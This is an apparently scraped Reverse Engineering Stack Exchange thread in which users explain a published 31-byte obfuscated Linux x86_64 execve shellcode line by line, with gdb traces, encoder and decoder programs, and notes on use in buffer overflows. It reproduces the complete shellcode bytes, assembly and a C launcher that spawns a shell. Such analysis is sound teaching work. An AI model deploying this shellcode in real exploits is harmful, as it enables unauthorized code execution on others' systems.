{
    "title": "What do the 20 lines of executable code in this exploit do?",
    "link": "https://reverseengineering.stackexchange.com/questions/11403/what-do-the-20-lines-of-executable-code-in-this-exploit-do",
    "content": "I stumbled upon this 31 bytes of Linux x86_64 Polymorphic execve Shellcode, posted by the author \"d4sh&r\":\nThe code seems to be a combination of assembly and C and looks like this:\n<pre><code>/*\n;Title: polymorphic execve shellcode\n;Author: d4sh&r\n;Contact: https://mx.linkedin.com/in/d4v1dvc\n;Category: Shellcode\n;Architecture:linux x86_64\n;SLAE64-1379\n;Description:\n;Polymorphic shellcode in 31 bytes to get a shell \n;Tested on : Linux kali64 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 x86_64 GNU/Linux\n\n;Compilation and execution\n;nasm -felf64 shell.nasm -o shell.o\n;ld shell.o -o shell\n;./shell\n\nglobal _start\n\n_start:\n    mul esi\n    push rdx\n    mov al,1                         \n    mov rbx, 0xd2c45ed0e65e5edc ;/bin//sh \n    rol rbx,24\n    shr rbx,1\n    push rbx\n    lea rdi, [rsp] ;address of /bin//sh\n    add al,58\n    syscall\n\n*/\n#include<stdio.h>\n//gcc -fno-stack-protector -z execstack shellcode.c -o shellcode\nunsigned char code[] = \"\\xf7\\xe6\\x52\\xb0\\x01\\x48\\xbb\\xdc\\x5e\\x5e\\xe6\\xd0\\x5e\\xc4\\xd2\\x48\\xc1\\xc3\\x18\\x48\\xd1\\xeb\\x53\\x48\\x8d\\x3c\\x24\\x04\\x3a\\x0f\\x05\";\n\nmain()\n{\n   int (*ret)()=(int(*)()) code;\n    ret();\n}\n</code></pre>\nI was curious, what do each of the lines 17-40 do, specifically, and how does this accomplish an exploit?\n(Line 17 is the one with the expression \"global _start\")\n",
    "votes": "5",
    "answers": 2,
    "views": "2k",
    "tags": [
        "assembly",
        "c"
    ],
    "user": null,
    "time": "Nov 26, 2015 at 1:22",
    "comments": [],
    "answers_data": [
        {
            "content": "EDIT: @EnricoGhirardi Thanks for pointing the mul esi inaccuracy I previously posted!\nTo start out, the first instruction mul esi zeroes out rax and rdx in the example below (this is only because rsi is 0 to begin with). The least significant bits will be stored in rax and the most significant bits will be stored in rdx. Both of these registers will be zero. We can verify this with the following after compiling the test code:\n<pre><code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode\ngdb shellcode\n\n**BANNER SNIPPED**\n\nDump of assembler code for function main:\n   0x00000000004004ed <+0>:     push   %rbp\n   0x00000000004004ee <+1>:     mov    %rsp,%rbp\n   0x00000000004004f1 <+4>:     sub    $0x10,%rsp\n   0x00000000004004f5 <+8>:     movq   $0x601060,-0x8(%rbp)\n   0x00000000004004fd <+16>:    mov    -0x8(%rbp),%rdx\n   0x0000000000400501 <+20>:    mov    $0x0,%eax\n   0x0000000000400506 <+25>:    callq  *%rdx\n   0x0000000000400508 <+27>:    leaveq \n   0x0000000000400509 <+28>:    retq   \nEnd of assembler dump.\n(gdb) b *0x0000000000400506\nBreakpoint 1 at 0x400506\n(gdb) c\nThe program is not being run.\n(gdb) r\n\n\nBreakpoint 1, 0x0000000000400506 in main ()\n(gdb) si\n0x0000000000601060 in code ()\n(gdb) disas\nDump of assembler code for function code:\n=> 0x0000000000601060 <+0>:     mul    %esi\n   0x0000000000601062 <+2>:     push   %rdx\n   0x0000000000601063 <+3>:     mov    $0x1,%al\n   0x0000000000601065 <+5>:     movabs $0xd2c45ed0e65e5edc,%rbx\n   0x000000000060106f <+15>:    rol    $0x18,%rbx\n   0x0000000000601073 <+19>:    shr    %rbx\n   0x0000000000601076 <+22>:    push   %rbx\n   0x0000000000601077 <+23>:    lea    (%rsp),%rdi\n   0x000000000060107b <+27>:    add    $0x3a,%al\n   0x000000000060107d <+29>:    syscall \n   0x000000000060107f <+31>:    add    %al,(%rax)\nEnd of assembler dump.\n(gdb) i r rax rdx\nrax            0x0      0\nrdx            0x601060 6295648\n(gdb) si\n0x0000000000601062 in code ()\n(gdb) i r rax rdx\nrax            0x0      0\nrdx            0x0      0\n</code></pre>\nAs we can see, rax and rdx are both 0, which means that esi (or rsi) has been multiplied by zero.\nThis is important because the shellcode eventually uses a syscall on line 29. We can see that syscall on line 29 is preceded by add al,58 where al is already 1, therefore the rax register will hold a value of 59. \nThe number 59 is the index for execve in the Linux x86_64 syscall table \nexecve will execute /bin//sh. Let's check out the function prototype:\n<pre><code>int execve(const char *filename, char *const argv[], \n       char *const envp[]); \n</code></pre>\nAccording to the prototype's description, filename must be either a binary executable, or a script starting with a line of the form \"#! interpreter [arg]\"\nWe will see that eventually the shellcode passed /bin//sh as this argument.\nargv are just the arguments passed to the binary. In this case, the arguments are NULL because as we have seen before, the rsi register was previously zeroed out on line 20.\nSimilarly, envp are the environment arguments passed to the binary. Again, there are none because we have seen that the mul %esi instruction has zeroed out both rsi and rdx. In x86_64 Linux, the rsi and rdx registers are the second and third arguments to execve() respectively.\nYou can find more information on x86_64 calling conventions here to see how arguments are passed into functions. \nFinally, the first argument in execve is /bin//sh, which is eventually passed to the edi register. edi holds the first function argument in Linux x86_64 assembly.\nThe interesting part is that this is polymorphic shellcode. We can think of polymorphic shellcode as obfuscated machine instructions that deobfuscate themselves upon execution.\nOn line 23, the hex string 0xd2c45ed0e65e5edc in ascii is ÒÄ^Ðæ^^Ü which is clearly obfuscated.\nLines 24 and 25 deobfuscate this string and we get 0x68732f2f6e69622f which is hs//nib/ in ascii. This is /bin//sh spelt backwards because the argument is passed to execve() in little endian byte order.\nFor proof of concept, you can run the code in gdb, or use the following deobfuscator I wrote:\n<pre><code>#include <stdio.h>\n#include <stdint.h>\n#include <inttypes.h>\n\nuint64_t rol(uint64_t v, unsigned int bits)\n{\n  return (v<<bits) | (v>>(8*sizeof(uint64_t)-bits));\n}\n\nint main(void)\n{\n  uint64_t obfuscated = 0xd2c45ed0e65e5edc;\n  uint64_t deobfuscated = rol(obfuscated, 24);\n  deobfuscated /= 2;\n  printf(\"0x%\" PRIx64 \"\n\", deobfuscated);\n  return 0;\n}\n</code></pre>\nYou will get the deobfuscated hex string 0x68732f2f6e69622f which again, is hs//nib/ in ascii.\nLine 26 pushes the deobfuscated /bin//sh on top of the stack (i.e. in the rsp register) and line 27 loads the address pointing to the string /bin//sh into rdi. Again, please note that this string is being passed in little endian byte ordering. Now we can clearly see that /bin//sh is the first argument in execve()\nThen, the shell is executed on line 29.\nBelow is a commented pseudocode summary:\n<pre><code>_start:\n    mul esi                     ; When this shellcode is executed, rsi and rdx become 0 because they are multiplied by rax which is 0, in Linux x86_64 assembly, rsi is the second argument in a function\n    push rdx                    ; save rdx (i.e. the buffer pointer to the shellcode), rdx is also the third argument passed to a syscall in x86_64\n    mov al,1                    ; used for obfuscation since mov al, 59 followed by syscall may look suspicious                       \n    mov rbx, 0xd2c45ed0e65e5edc ;/bin//sh obfuscated \n    rol rbx,24                  ; Deobfuscate the hex string /bin//sh\n    shr rbx,1                   ; Division by 2 to further deobfuscate /bin//sh\n    push rbx                    ; Push the hex string on the top of the stack [in rsp]\n    lea rdi, [rsp]              ; Load /bin//sh into rdi in little endian\n                                ; in linux 86_64 the first argument is passed to rdi during a syscall\n    add al,58                   ; al = 59 i.e. call execve\n    syscall                     ; execve(\"/bin//sh\", 0, *shellcode_buffer)\n</code></pre>\nAs for the C code, the machine instructions that represent the compiled assembly from lines 17 - 29 are stored in a global variable. We can use the following commands to check the bytes from the shellcode:\n<pre><code>    $ nasm -felf64 shell.asm -o shell.o\n    $ ld shell.o -o shell\n    $ xxd shell\n\n    CONTENT SNIPPED\n    00000080: f7e6 52b0 0148 bbdc 5e5e e6d0 5ec4 d248  ..R..H..^^..^..H\n    00000090: c1c3 1848 d1eb 5348 8d3c 2404 3a0f 0500  ...H..SH.<$.:...\n</code></pre>\nAs we can see, it matches with the following buffer in the C code:\n<pre><code>unsigned char code[] = \"\\xf7\\xe6\\x52\\xb0\\x01\\x48\\xbb\\xdc\\x5e\\x5e\\xe6\\xd0\\x5e\\xc4\\xd2\\x48\\xc1\\xc3\\x18\\x48\\xd1\\xeb\\x53\\x48\\x8d\\x3c\\x24\\x04\\x3a\\x0f\\x05\";\n</code></pre>\nThe code in main simply casts the string buffer global variable into a function pointer which is then called, executing the polymorphic shellcode, and spawning a shell.\nFinally, shellcode is just a possible part of an exploit. An exploit consists of an input that is precisely tailored to a specific version of a program and OS. The shellcode can be part of the payload, but operating systems have became more secure adding ASLR (Address Stack Layout Randomization) and DEP (Data Execution Prevention), so generally it is more practical to overwrite a function pointer in to GOT (Global Offset Table) than to inject shellcode into a buffer. Assuming that you were performing a generic stack buffer overflow, the buffer would have to be at least 0x19 bytes long. You would also need some more space to compensate for the rest of the exploit. In other words, you would need a buffer with enough space to fit the shellcode and the rest of the exploit so that you could overwrite the RET address on the stack to redirect program execution (RIP/EIP) to your shellcode. \nThis is just an example, but there are many more ways this shellcode can be used in a exploit. \nTaking a few steps back, this shellcode could fail if esi/rsi is not 0 to begin with because if it is not zero, then we will have a second argument passed into execve() and possibly even a third agument if the result from the instruction mul esi overflows into edx. The shellcode would be more reliable if there were an xor esi, esi instruction preceeding the mul esi instruction.\nWe also might think how the exploit developer came up with the obfuscated hex string 0xd2c45ed0e65e5edc. They simply took original string hs//nib/ and applied the deobfuscating instructions in reverse order. You can use the following code for proof of concept:\n<pre><code>#include <stdio.h>\n#include <stdint.h>\n#include <inttypes.h>\n\nuint64_t ror(uint64_t v, unsigned int bits)\n{\n  return (v>>bits) | (v<<(8*sizeof(uint64_t)-bits));\n}\n\nint main(void)\n{\n  uint64_t deobfuscated = 0x68732f2f6e69622f;\n  uint64_t obfuscated = deobfuscated * 2;\n  obfuscated = ror(obfuscated, 24);\n  printf(\"0x%\" PRIx64 \"\n\", obfuscated);\n  return 0;\n}\n</code></pre>\nYou should get the original obfuscated hex string 0xd2c45ed0e65e5edc.\n",
            "votes": "10",
            "user": "Community",
            "time": "May 23, 2017 at 12:37",
            "is_accepted": true,
            "comments": [
                {
                    "user": "user14246",
                    "text": "<span class=\"comment-copy\">thank you @itsbriany for the exhaustive answer and all those references.</span>",
                    "time": null
                },
                {
                    "user": "mikalai",
                    "text": "<span class=\"comment-copy\">Great answer! But the code in question is far from being polymorphic.</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "The answer above is correct for the most part but it includes some inaccuracies. I can't comment so I'll add the corrections in this answer.\nFirst I don't think this is a good shellcode since it takes an assumption on both %rax and %rsi. \n@itsbriany correctly points out that %rax is zero, but that is the case only in the specific launcher that the author wrote.\nWhen defining the ret function the number of arguments isn't specified, making it for the C standard a variadic function. For the x86_64 ABI, if a function has variable arguments then AL (which is part of EAX) is expected to hold the number of vector registers used to hold arguments to that function.\nJust by changing the definition to ret like this:\n<pre><code>int (*ret)(void)=(int(*)()) code;\n</code></pre>\nresults in a segmentation fault. \nThen the operation \n<pre><code>mul esi\n</code></pre>\ndoesn't zero out %esi as the other answers implies. In this case it multiplies %esi and %eax and stores upper bits in %edx lower bits in %eax, thus clearing %edx as a result. %esi is never modified and in fact it still points to the argv array of the original program. In another program where %esi has some invalid values the shell code won't work either. \nAlso %edx is pushed on the stack for no reason it seems.\n",
            "votes": "6",
            "user": "Enrico Ghirardi",
            "time": "Nov 26, 2015 at 13:19",
            "is_accepted": false,
            "comments": []
        }
    ]
}